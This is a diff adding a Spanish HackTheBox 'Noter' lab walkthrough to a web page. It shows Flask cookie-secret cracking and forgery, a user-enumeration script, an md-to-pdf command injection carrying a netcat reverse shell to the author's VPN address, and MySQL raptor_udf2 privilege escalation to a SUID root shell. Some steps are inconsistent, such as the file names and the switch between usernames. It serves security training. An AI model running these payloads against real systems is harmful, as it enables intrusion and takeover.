@@ -68,7 +68,487 @@
     <script>
         // Obtener el contenido del post en formato Markdown (puedes reemplazar esto con tu propia lógica)
         const markdownContent = `
-# Máquina "Noter" de HackTheBox
+# Máquina "Noter" de HackTheBox:
+
+Caracteristicas:
+
+- Information Leakage 
+- User Enumeration [Brute-Force Wfuzz] Finding valid users 
+- Wfuzz SSTI (Server Side Template Injection) [Failed] 
+- JWT Enumeration Abusing JWT 
+- Flask-Unsign Cracking Flask Cookie Secret 
+- Flask-Unsign Cookie Hijacking 
+- FTP Enumeration 
+- Information Leakage in PDF document 
+- Finding a command injection in the web RCE in md-to-pdf 4.1.0 
+- Abusing the vulnerable code definition 
+- Alternative Command Injection (RCE) Abusing MYSQL service running as the root user [Privilege Escalation] (raptor_udf2.so)
+- MySql
+- FLask token
+- FTP
+
+Util en:
+
+- eWPT 
+- eWPTXv2 
+- OSWE 
+- OSCP
+
+        IP 10.10.11.160
+
+- nmap -sV -p- -oA 10.10.11.160 10.10.11.160
+
+<pre>
+<code>
+PORT STATE SERVICE VERSION
+21/tcp open ftp vsftpd 3.0.3
+22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code>
+</pre>
+
+
+Vemos 3 puertos abiertos, SSH, FTP y un servidor web ejecutándose en el puerto 5000. Accedamos al servidor web en el puerto 5000 desde un navegador web.
+No pudismos entrar por el puerto 21 ftp asi que intentaremos cuando tengamos credenciales
+
+<img src="imagenes/noter/webpage1.png" alt="Texto alternativo" width="500">
+
+Los enlaces "Inicio" y "Notas" simplemente redirigen a /login. Intentamos iniciar con creds por defecto sin resultados
+vamos a la seccion registrarnos y podemos entrar. Da mensajes distintos si cambiamos users y ponemos creds correctas lo que significa que podriamos sacar usuarios existentes 
+por fuerza bruta.
+
+<img src="imagenes/noter/dashboard1.webp" alt="Texto alternativo" width="500">
+
+Al iniciar sesión, tenemos una sesión válida con una cookie, verifiquemos si después de iniciar sesión podemos ver más directorios y ver si podemos encontrar otros archivos útiles.
+
+<pre>
+<code>
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://10.129.173.105:5000/FUZZ -H "Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiamF5ZGVuIn0.YonraA.yW130NmEJTMGWTMRAaJeW5JTL8c"
+register                [Status: 200, Size: 2646, Words: 523, Lines: 95, Duration: 247ms]
+login                   [Status: 200, Size: 1967, Words: 427, Lines: 67, Duration: 277ms]
+logout                  [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 234ms]
+dashboard               [Status: 200, Size: 2361, Words: 560, Lines: 83, Duration: 220ms]
+notes                   [Status: 200, Size: 1703, Words: 388, Lines: 61, Duration: 224ms]
+VIP                     [Status: 200, Size: 1742, Words: 398, Lines: 58, Duration: 225ms]
+</code>
+</pre>
+
+Estas páginas ya se pueden navegar con solo iniciar sesión, por lo que no hay nada nuevo aquí.
+Al inspeccionar la cookie de sesión, tiene el formato de JWT, probémoslo en https://jwt.io para validar si es un JWT válido. 
+
+<img src="imagenes/noter/jwt1.png" alt="Texto alternativo" width="500">
+
+No es un JWT válido, pero casi sigue el mismo formato, con la cadena antes del primer "." estar codificado en base64. Volviendo a ver qué servicio se identificó 
+en el puerto 5000, que es **Werkzeug**, busquemos qué tipos de cookies puede generar WerkZeug. Nos encontramos con Cookie Segura(https://werkzeug.palletsprojects.com/en/0.16.x/contrib/securecookie/). 
+Después de jugar con esto, el resultado no es el tipo de cookie correcto. Después de encontrar Flask Session Cookie Decoder (https://www.kirsle.net/wizards/flask-session.cgi) 
+e ingresar nuestra cookie de sesión, podemos concluir que el tipo de cookie es utilizado por flask. Esta cookie está firmada con una clave secreta que se almacena en 
+la clase app.config. Si pudiéramos forzar la clave secreta por fuerza bruta, podríamos falsificar nuestra propia cookie con cualquier nombre de usuario y obtener acceso a las 
+notas de otros usuarios.
+
+Usando flask-unsign (https://pypi.org/project/flask-unsign/), podemos forzar la clave "secreta" por fuerza bruta. 
+
+<pre>
+<code>
+$ flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiamF5ZGVuIn0.Yn0P8Q.XaXAKhvjJ6uPpxdUw1V0KPitAW8'
+[*] Session decodes to: {'logged_in': True, 'username': 'jayden'}
+[*] No wordlist selected, falling back to default wordlist..
+[*] Starting brute-forcer with 8 threads..
+[*] Attempted (2048): -----BEGIN PRIVATE KEY-----***
+[+] Found secret key after 16768 attempts-FF35-D147FB
+'secret123'
+</code>
+</pre>
+
+Luego confirmé que esta era la clave secreta para firmar cookies, generando mi propia cookie nuevamente y luego confirmando que aún podía iniciar sesión
+
+- flask-unsign --sign --cookie "{'logged_in': True, 'username' :'admin'}" --secret secret123
+
+eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.YoIo2Q.spOR6sUSMWZOX5_xKq9iiwkfTFk
+
+Con esto ahora podemos comenzar a forzar los nombres de usuario. POC para enumerar nombres de usuario válidos:  
+
+<pre>
+<code>
+import sys
+import requestsfilename = sys.argv[1]url = 'http://10.10.11.160:5000/login'
+proxies = {'http':'http://127.0.0.1:8080'}with open(filename) as file:
+    lines = file.readlines()
+    lines = [line.rstrip() for line in lines]
+        for line in lines:
+        data = {'username':line, 'password':'1234'}
+    x = requests.post(url, data, proxies=proxies)
+    if("Invalid login" in x.text):
+    print(line)
+</code>
+</pre>
+
+despues de lanzarlo me da como salida, el usuario blue
+continuamos mirando y Las cookies de matraz están firmadas con un secreto, por lo que no se pueden modificar sin conocer ese secreto. Es posible realizar un ataque 
+de fuerza bruta para comprobar si hay un secreto débil y flask-unsignproporciona esa capacidad utilizando --unsigncon -wdando una lista de palabra
+
+ejecutándolo con rockyou.txtdevuelve un error: 
+
+<pre>
+<code>
+- flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiMHhkZiJ9.YkOi3w.izn9BJ3ifHAo0BAfnrWr3EW6Nuc' -w /usr/share/wordlists/rockyou.txt 
+
+[*] Session decodes to: {'logged_in': True, 'username': '0xdf'}
+[*] Starting brute-forcer with 8 threads..
+[!] Unhandled exception in cracker thread. Please report this issue on the official bug tracker: "https://github.com/Paradoxis/Flask-Unsign/issues" and don't forget to include the following traceback:
+
+## Stack Trace
+FlaskUnsignException: Secret must be a string-type (bytes, str) and received 'int'. To fix this, either add quotes to the secret 123456 or use the --no-literal-eval argument.
+  File "/usr/lib/python3.8/multiprocessing/pool.py", line 125, in worker
+    result = (True, func(*args, **kwds))
+  File "/home/oxdf/.local/lib/python3.8/site-packages/flask_unsign/cracker.py", line 69, in unsign
+    if session.verify(self.session, secret, legacy=self.legacy, salt=self.salt):
+  File "/home/oxdf/.local/lib/python3.8/site-packages/flask_unsign/session.py", line 29, in verify
+    raise FlaskUnsignException(
+
+[!] Failed to find secret key after 0 attempts.
+</code>
+</pre>
+
+Parece interpretar "123456" en el archivo como un int, lo cual es extraño. Pero luego el mensaje de excepción indica cómo solucionar este problema, agregando --no-lteral-eval. 
+Agregaré eso y funciona, encontrando el secreto muy rápidamente: 
+
+<pre>
+<code>
+- flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiMHhkZiJ9.YkOi3w.izn9BJ3ifHAo0BAfnrWr3EW6Nuc' -w /usr/share/wordlists/rockyou.txt --no-literal-eval
+[*] Session decodes to: {'logged_in': True, 'username': 'test'}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 17024 attempts
+b'secret123'
+</code>
+</pre>
+
+ahora, usaré flask-unsignpara hacer una galleta con el user encontrado:
+
+- flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret secret123
+
+eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YkRUJg.-0B60ZY6aQyHOSoCxBnWGOx-Rbw
+
+reemplazando la cookie actual en las herramientas de desarrollo de Firefox y luego recargando /dashboard muestra que ahora estoy conectado como blue: 
+
+<img src="imagenes/noter/blue1.webp" alt="Texto alternativo" width="500">
+
+ahora si miramos las notas podremos ver la siguiente.
+
+<pre>
+<code>
+Written by ftp_admin on Mon Dec 20 01:52:32 2021
+
+Hello, Thank you for choosing our premium service. Now you are capable of
+doing many more things with our application. All the information you are going
+to need are on the Email we sent you. By the way, now you can access our FTP
+service as well. Your username is 'blue' and the password is 'blue@Noter!'.
+Make sure to remember them and delete this.  
+(Additional information are included in the attachments we sent along the
+Email)  
+
+We all hope you enjoy our service. Thanks!  
+
+ftp_admin
+
+</code>
+</pre>
+
+Ahora podemos iniciar sesión en el servidor FTP con el usuario blue
+
+<pre>
+<code>
+    ftp 10.10.11.160
+Connected to 10.10.11.160.
+220 (vsFTPd 3.0.3)
+Name (10.10.11.160:jayden): blue
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
+-rw-r--r--    1 1002     1002        12569 Dec 24 20:59 policy.pdf
+226 Directory send OK.
+ftp> 
+</code>
+</pre>
+
+Tras descargar Policy.pdf, nos indica las políticas de contraseñas de la organización. En la línea 4 "Creación de contraseña", indica 
+
+1. Default user-password generated by the application is in the format of "username@site_name!" (This applies to all your applications)
+
+El otro nombre de usuario que obtuvimos fue el de la nota, "ftp_admin". Esto haría que la contraseña ftp_admin predeterminada fuera "ftp_admin@Noter!" 
+Probemos esto en el servidor FTP. 
+
+
+<pre>
+<code>
+$ftp 10.10.11.160
+Connected to 10.10.11.160.
+220 (vsFTPd 3.0.3)
+Name (10.10.11.160:jayden): ftp_admin
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
+-rw-r--r--    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip
+226 Directory send OK.
+ftp> 
+</code>
+</pre>
+
+¡Efectivamente funciona! Descarguemos estos zips, ya que parecen ser el código fuente de este servidor. En app_backup_1635803546.zip/app.py podemos ver las credenciales de MySQL codificadas en el archivo; anótelas para más adelante. 
+
+<pre>
+<code>
+$cat app.py | grep -i mysql
+from flask_mysqldb import MySQL
+# Config MySQL
+app.config['MYSQL_HOST'] = 'localhost'
+app.config['MYSQL_USER'] = 'root'
+app.config['MYSQL_PASSWORD'] = 'Nildogg36'
+app.config['MYSQL_DB'] = 'app'
+app.config['MYSQL_CURSORCLASS'] = 'DictCursor
+</code>
+</pre>
+
+Al explorar el código fuente app_backup_1638395546.zip, encontramos que se implementa la función de exportación de rebajas a PDF e importación de rebajas a PDF. 
+Utiliza la biblioteca md-to-pdf para lograr esta función. La búsqueda de CVE para md-to-pdf nos lleva a CVE-2021-23639 , que nos permite tener RCE. Para aprovechar esto, 
+necesitamos utilizar la función "Exportar directamente desde la nube" de la sección VIP. Esto sólo es visible si estás conectado como usuario "azul", 
+ya que los usuarios normales no tienen "VIP". 
+
+<img src="imagenes/noter/export1.png" alt="Texto alternativo" width="500">
+
+Para obtener RCE con éxito, necesitamos que la función "Exportar directamente desde la nube" apunte a un archivo de rebajas que controlamos. Esto es fácil de lograr 
+ejecutando un servidor web simple en el puerto 80 y apuntando la función "Exportar directamente desde la nube" a nuestra máquina local, http://VPN_IP:5000/test.md. 
+
+Creé los archivos de script de payload reverse shell y bash a continuación y 2 comandos, podemos encadenarlos para obtener un shell inverso. 
+
+archivo.md
+
+---js\n((require("child_process")).execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f"))\n---RCE
+
+Iniciaré un servidor web Python y un ncoyente y enviar http://10.10.14.6/payload.mda Noter. Hay una conexión en el servidor web y luego una conexión en nc: 
+
+- nc -lnvp 443
+
+configuramos la shell:
+
+- script /dev/null -c bash
+- ctrl + z
+- stty raw -echo: fg
+- reset xterm
+- export TERM=xterm
+- uname -a
+
+y podemos buscar la flag de user
+
+No hay mucho interés en el directorio de inicio del usuario. La aplicación web parece estar agotándose app, pero ya tuve acceso a ese código fuente. 
+La fuente en vivo muestra al nuevo usuario de MySQL: 
+
+<pre>
+<code>
+# Config MySQL
+app.config['MYSQL_HOST'] = 'localhost'
+app.config['MYSQL_USER'] = 'DB_user'
+app.config['MYSQL_PASSWORD'] = 'DB_password'
+app.config['MYSQL_DB'] = 'app'
+app.config['MYSQL_CURSORCLASS'] = 'DictCursor' 
+</code>
+</pre>
+
+/opttiene un solo archivo, backup.sh:
+
+- svc@noter:/opt$ ls
+
+- backup.sh
+
+Esto parece ser lo que creó las copias de seguridad que encontré a través de FTP, pero claramente no se ejecuta con frecuencia. 
+
+Correr ps auxww no proporciona ningún proceso excepto los propiedad de svc: 
+
+<pre>
+<code>
+    svc@noter:/srv/ftp/ftp_admin$ ps auxww
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+svc         1141  0.0  1.2 618460 51596 ?        Ssl  16:38   0:04 PM2 v5.2.0: God Daemon (/home/svc/.pm2)
+svc         1170  0.2  1.1 485808 45816 ?        Ssl  16:38   0:25 python3 /home/svc/app/web/app.py
+svc        12868  0.1  1.4 601756 58464 ?        Sl   19:40   0:00 node /home/svc/app/web/misc/md-to-pdf.js ---js ((require("child_process")).execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f")) ---RCE 9439
+svc        12875  0.0  0.0   2608   536 ?        S    19:40   0:00 /bin/sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f
+svc        12878  0.0  0.0   7372   516 ?        S    19:40   0:00 cat /tmp/f
+svc        12879  0.0  0.0   2608   596 ?        S    19:40   0:00 /bin/sh -i
+svc        12880  0.0  0.0   3332  1956 ?        R    19:40   0:00 nc 10.10.14.6 443
+svc        12881  0.0  0.0   7356  2272 ?        S    19:42   0:00 script /dev/null -c bash
+svc        12882  0.0  0.1  10060  5180 pts/0    Ss   19:42   0:00 bash
+svc        12936  0.0  0.0  10612  3320 pts/0    R+   19:49   0:00 ps auxww
+</code>
+</pre>
+
+Nada interesante ahí. /proc está montado con hide pid=2. Para ver qué más podría estar ejecutándose, miraré /etc/systemd para buscar servicios. Hay mucho aquí. Comenzaré con MySQL, 
+ya que sé que se está ejecutando: 
+
+<pre>
+<code>
+find . -name '*.service' | grep sql
+./system/multi-user.target.wants/mysqlcheck.service
+./system/multi-user.target.wants/mysql-start.service
+./system/mysqlcheck.service
+./system/mysql-start.service
+</code>
+</pre>
+
+mysql-start.servicemuestra que el servicio se está ejecutando como root: 
+
+<pre>
+<code>
+[Unit]
+Description=MySQL service
+
+[Service]
+ExecStart=/usr/sbin/mysqld
+User=root
+Group=root
+
+[Install]
+WantedBy=multi-user.target
+</code>
+</pre>
+
+Hay un montón de publicaciones sobre cómo explotar MySQL (https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf) ejecutándose como root usando un código denominado Raptor. La idea es escribir una biblioteca compartida que ejecute comandos
+de SQL en el directorio de complementos y luego agregar un comando para acceder a ella y ejecutarla como root.
+
+Necesitaré obtener una copia del archivo exploit y compilarlo siguiendo las instrucciones de los comentarios: 
+
+- wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c
+
+- gcc -g -c raptor_udf2.c
+
+- gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+
+Ahora lo subiré a Noter en /dev/shm.
+
+Cargar biblioteca
+
+Me conectaré a MySQL como root, no como DB_user (ese usuario carece de privilegios), y usaré la  base de datos mysql: 
+
+- mysql -u root -pNildogg36 mysql
+
+voy a crear un footabla y lea el binario en ella:
+
+<pre>
+<code>
+MariaDB [mysql]> create table foo(line blob);
+Query OK, 0 rows affected (0.007 sec)
+
+MariaDB [mysql]> insert into foo values(load_file('/dev/shm/raptor_udf2.so'));
+Query OK, 1 row affected (0.002 sec)
+</code>
+</pre>
+
+Lo siguiente que necesito saber es el directorio de complementos: 
+
+<pre>
+<code>
+    MariaDB [mysql]> show variables like '%plugin%';
++-----------------+---------------------------------------------+
+| Variable_name   | Value                                       |
++-----------------+---------------------------------------------+
+| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
+| plugin_maturity | gamma                                       |
++-----------------+---------------------------------------------+
+2 rows in set (0.001 sec)
+</code>
+</pre>
+
+Escribiré ese binario en el directorio de complementos de arriba y lo cargaré como una función definida por el usuario:
+
+<pre>
+<code>
+MariaDB [mysql]> select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'; 
+Query OK, 1 row affected (0.000 sec)
+MariaDB [mysql]> create function do_system returns integer soname 'raptor_udf2.so';
+Query OK, 0 rows affected (0.001 sec)
+</code>
+</pre>
+
+Para probarlo, usaré la función para ejecutar id y escribir el resultado en un archivo. Me aseguraré de cambiar los permisos del archivo para poder leerlo: 
+
+<pre>
+<code>
+    MariaDB [mysql]> select do_system('id > /dev/shm/test; chmod 777 /dev/shm/test');
++----------------------------------------------------------+
+| do_system('id > /dev/shm/test; chmod 777 /dev/shm/test') |
++----------------------------------------------------------+
+|                                                        0 |
++----------------------------------------------------------+
+1 row in set (0.005 sec)
+</code>
+</pre>
+
+La salida en mysqlno es útil, pero el archivo está ahí y fue ejecutado por root: 
+
+<pre>
+<code>
+svc@noter:/dev/shm$ ls -l test 
+-rwxrwxrwx 1 root root 39 Mar 30 21:08 test
+svc@noter:/dev/shm$ cat test 
+uid=0(root) gid=0(root) groups=0(root)
+</code>
+</pŕe>
+
+Para conseguir un shell de root, volveré a  mysql a copiar el bash  para que sea SUID: 
+
+<pre>
+<code>
+MariaDB [mysql]> select do_system('cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf');
++-----------------------------------------------------------+
+| do_system('cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf') |
++-----------------------------------------------------------+
+|                                                         0 |
++-----------------------------------------------------------+
+1 row in set (0.006 sec)
+</code>
+</pre>
+
+Necesitaré encontrar un lugar para trabajar que no sea /dev/shm, ya que está montado nosuid: 
+
+- svc@noter:/dev/shm$ mount | grep shm
+
+- tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
+
+/tmpfuncionará bien.
+
+Por como bashelimina privs, ejecutar esto devolverá un shell no root: 
+
+- svc@noter:/dev/shm$ /tmp/test
+
+test-5.0$
+
+Salir de eso y volver a ejecutar con -p dará raíz: 
+
+- svc@noter:/dev/shm$ /tmp/test -p
+
+test-5.0# id
+
+uid=1001(svc) gid=1001(svc) euid=0(root) groups=1001(svc)
+
+ahora podemos leer root.
+
+Algunos de los writeups en esta página, pueden tener contenido de otras páginas o tener muy pocas imágenes, esto 
+debido a que en algunas de las máquinas que realice, no tome los apuntes o no tome capturas de pantalla, así que he decidido buscar varios writeups
+y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí, también si encuentra faltas de ortografía 
+o cualquier error, Puedes contactarme a mi correo.
+
+lerioxirit@proton.me
 
 
         `;
